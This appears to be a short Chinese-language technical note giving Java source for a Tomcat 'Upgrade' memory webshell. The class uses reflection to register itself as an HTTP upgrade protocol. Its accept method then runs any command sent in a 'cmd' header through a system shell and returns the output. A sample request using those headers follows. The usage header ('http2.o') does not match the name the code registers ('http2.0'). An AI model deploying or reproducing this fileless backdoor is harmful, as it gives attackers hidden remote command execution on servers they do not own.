# Upgrade

参考：https://tttang.com/archive/1709

```java
package com.example.demo;


import org.apache.catalina.connector.Connector;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.RequestFacade;
import org.apache.coyote.Adapter;
import org.apache.coyote.Processor;
import org.apache.coyote.Response;
import org.apache.coyote.UpgradeProtocol;
import org.apache.coyote.http11.AbstractHttp11Protocol;
import org.apache.coyote.http11.upgrade.InternalHttpUpgradeHandler;
import org.apache.tomcat.util.net.SocketWrapperBase;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;

import javax.servlet.http.HttpServletRequest;
import java.lang.reflect.Field;
import java.nio.ByteBuffer;
import java.util.HashMap;

public class UpgradeMemShell implements UpgradeProtocol {

    public UpgradeMemShell() throws Exception{
        HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
        RequestFacade rf = (RequestFacade) request;
        Field requestField = RequestFacade.class.getDeclaredField("request");
        requestField.setAccessible(true);
        Request request1 = (Request) requestField.get(rf);

        Field connector = Request.class.getDeclaredField("connector");
        connector.setAccessible(true);
        Connector realConnector = (Connector) connector.get(request1);

        Field protocolHandlerField = Connector.class.getDeclaredField("protocolHandler");
        protocolHandlerField.setAccessible(true);
        AbstractHttp11Protocol handler = (AbstractHttp11Protocol) protocolHandlerField.get(realConnector);

        HashMap<String, UpgradeProtocol> upgradeProtocols = null;
        Field upgradeProtocolsField = AbstractHttp11Protocol.class.getDeclaredField("httpUpgradeProtocols");
        upgradeProtocolsField.setAccessible(true);
        upgradeProtocols = (HashMap<String, UpgradeProtocol>) upgradeProtocolsField.get(handler);
        upgradeProtocols.put("http2.0", this);
        upgradeProtocolsField.set(handler, upgradeProtocols);
        System.out.println("success");
    }

    @Override
    public String getHttpUpgradeName(boolean b) {
        return null;
    }

    @Override
    public byte[] getAlpnIdentifier() {
        return new byte[0];
    }

    @Override
    public String getAlpnName() {
        return null;
    }

    @Override
    public Processor getProcessor(SocketWrapperBase<?> socketWrapperBase, Adapter adapter) {
        return null;
    }

    @Override
    public InternalHttpUpgradeHandler getInternalUpgradeHandler(Adapter adapter, org.apache.coyote.Request request) {
        return null;
    }

    public boolean accept(org.apache.coyote.Request request) {
        System.out.println("MyUpgrade.accept");
        String p = request.getHeader("cmd");
        try {
            String[] cmd = System.getProperty("os.name").toLowerCase().contains("windows") ? new String[]{"cmd.exe", "/c", p} : new String[]{"/bin/sh", "-c", p};
            Field response = org.apache.coyote.Request.class.getDeclaredField("response");
            response.setAccessible(true);
            Response resp = (Response) response.get(request);
            byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter("\\A").next().getBytes();
            resp.doWrite(ByteBuffer.wrap(result));
        } catch (Exception e){}
        return false;
    }
}
```

使用
```txt
Upgrade: http2.o
cmd: calc
Connection: Upgrade
```
